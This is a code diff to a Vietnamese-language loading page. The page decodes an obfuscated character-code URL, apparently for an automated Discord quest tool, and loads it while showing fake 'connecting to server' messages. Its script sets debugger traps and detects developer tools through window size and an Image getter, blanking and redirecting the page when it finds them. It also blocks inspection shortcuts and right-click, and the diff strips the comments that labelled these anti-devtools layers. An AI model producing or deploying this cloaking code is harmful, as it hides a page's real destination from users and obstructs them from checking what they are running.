@@ -107,13 +107,13 @@
             <div class="progress-track"><div class="progress-fill"></div></div>
         </div>
         <div class="status-container">
-            <div class="status" id="statusText">Dang ket noi den may chu<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
+            <div class="status" id="statusText">Đang kết nối đến máy chủ<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
         </div>
         <div class="features">
             <div class="pill"><span class="pill-dot"></span>Offline Sync</div>
             <div class="pill"><span class="pill-dot"></span>Cloud 24/7</div>
-            <div class="pill"><span class="pill-dot"></span>Ma hoa da tang</div>
-            <div class="pill"><span class="pill-dot"></span>Da nen tang</div>
+            <div class="pill"><span class="pill-dot"></span>Đơn giản</div>
+            <div class="pill"><span class="pill-dot"></span>Đa nền tảng</div>
         </div>
     </div>
 
@@ -122,19 +122,16 @@
         var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
         var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
 
-        /* Anti devtools — gọn, hiệu quả */
         var _kill=function(){
             document.body.innerHTML='';
             window.location.replace('about:blank');
         };
         var _warn=0;
-
-        /* Lớp 1: debugger trap */
+        
         setInterval(function(){
             (function(){}['constructor']('\x64\x65\x62\x75\x67\x67\x65\x72')['call']());
         },800);
 
-        /* Lớp 2: detect DevTools mở qua window size */
         setInterval(function(){
             var w=window.outerWidth-window.innerWidth>200;
             var h=window.outerHeight-window.innerHeight>200;
@@ -146,20 +143,17 @@
             }
         },1000);
 
-        /* Lớp 3: Image getter trick — chỉ trigger khi DevTools inspect */
         var _img=new Image();
         Object.defineProperty(_img,'\x69\x64',{get:function(){_kill()}});
         setInterval(function(){console.log(_img);console.clear()},3000);
 
-        /* Block phím tắt */
+
         document.onkeydown=function(e){
             if(e.keyCode==123||(e.ctrlKey&&(e.shiftKey&&(e.keyCode==73||e.keyCode==74)||e.keyCode==85)))return false;
         };
 
-        /* Block right-click bằng defineProperty */
         try{Object.defineProperty(document,'\x6f\x6e\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75',{get:function(){return function(){return false}},set:function(){}})}catch(e){}
 
-        /* Particles */
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
         var ps=[];
@@ -226,7 +220,6 @@
         }
         loop();
 
-        /* Status messages */
         var msgs=['Dang ket noi den may chu','Dang xac thuc du lieu','Dang tai tai nguyen','Dang khoi chay he thong'];
         var si=0;
         function cycle(){
@@ -237,7 +230,6 @@
             }
         }
 
-        /* Init */
         addEventListener('DOMContentLoaded',function(){
             cycle();
             var frame=document.getElementById('content-frame');
